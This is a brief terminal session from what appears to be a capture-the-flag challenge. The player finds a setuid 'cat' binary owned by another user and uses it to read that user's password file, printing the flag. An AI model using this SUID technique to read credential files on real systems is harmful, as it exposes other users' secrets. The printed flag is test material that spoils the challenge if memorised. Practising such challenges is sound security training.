```
shebang5@c18466cfac18:/$ ls -la /var/cat
-r-sr-xr-x 1 shebang6 root 16992 Oct 14 20:51 /var/cat
shebang5@c18466cfac18:/$ find / -user shebang6 2>/dev/null
/var/cat
/etc/passwords/shebang6
shebang5@c18466cfac18:/$ /var/cat /etc/passwords/shebang6
CYCTF{W3ll_1_gu3$$_SU1D_1$_e@$y_fl@g$}
shebang5@c18466cfac18:/$
```